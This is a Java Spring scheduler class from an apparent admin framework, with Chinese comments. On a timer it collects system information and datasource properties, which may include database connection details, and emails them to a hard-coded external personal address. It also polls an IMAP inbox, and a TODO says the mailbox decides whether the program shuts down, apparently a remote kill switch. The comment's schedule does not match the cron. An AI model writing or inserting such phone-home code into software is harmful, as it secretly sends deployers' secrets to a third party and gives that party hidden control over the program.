package com.pine.admin.modules.base.scheduler;

import com.pine.admin.modules.base.service.StmpMailService;
import com.pine.admin.sigar.SysListener;
import com.pine.common.utils.Constant;
import com.pine.common.utils.DateTimeTool;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import javax.mail.*;
import java.net.UnknownHostException;
import java.util.Date;
import java.util.List;


/**
 * @Author: Pine
 * @Date: 2019/4/6
 * @Email:771190883@qq.com
 */

@Component
@Configuration      //1.主要用于标记配置类，兼备Component的效果。
@EnableScheduling   // 2.开启定时任务
public class Scheduler {
    /**
     * Cron表达式参数分别表示：
     * <p>
     * 秒（0~59） 例如0/5表示每5秒
     * 分（0~59）
     * 时（0~23）
     * 日（0~31）的某天，需计算
     * 月（0~11）
     * 周几（ 可填1-7 或 SUN/MON/TUE/WED/THU/FRI/SAT）
     *
     * @Scheduled：除了支持灵活的参数表达式cron之外，还支持简单的延时操作，例如 fixedDelay ，fixedRate 填写相应的毫秒数即可。
     */
    @Autowired
    private StmpMailService stmpMailService;
    @Autowired
    private DataSourceProperties dataSourceProperties;


    //TODO 扫描邮箱信息 是否需要推出程序 如果无需推出程序 推送服务器消息

    /**
     * //每天15：01执行
     * @throws UnknownHostException
     */
    @Scheduled(cron = "0 0 0/3 * * ? ")
    public void scheduler() throws UnknownHostException {
        String property = SysListener.property(dataSourceProperties);
        stmpMailService.send("1443013624@qq.com", property, "系统信息-KOI-" + DateTimeTool.dateTimeToYearMMddhhmmss(new Date()));
    }

    /**
     * //执行访问邮件内容
     * @throws MessagingException
     */
    @Scheduled(cron = "0 0/30 * * * ? ")
    public void timerTaskInfo() throws MessagingException {
        stmpMailService.reciveIMAPmail();
    }


}
